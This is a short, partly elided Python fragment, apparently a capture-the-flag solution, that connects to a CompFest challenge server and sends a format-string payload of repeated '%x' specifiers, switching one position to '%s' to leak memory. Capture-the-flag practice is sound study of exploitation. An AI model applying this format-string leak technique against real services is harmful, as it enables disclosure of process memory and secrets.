...
payload =  '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x'

conn = remote('challenges.ctf.compfest.id', 9008)
conn.recvline()
conn.recvline()
conn.recvline()
conn.recvline()
...
conn.recvline()
conn.sendline(b'N')
payload = payload[:i] + 's' + payload[i+1:]
# print(payload.encode('utf-8'))
conn.sendline(payload.encode('utf-8'))
conn.recvline()
payload = payload[:i] + 'x' + payload[i+1:]
conn.close()
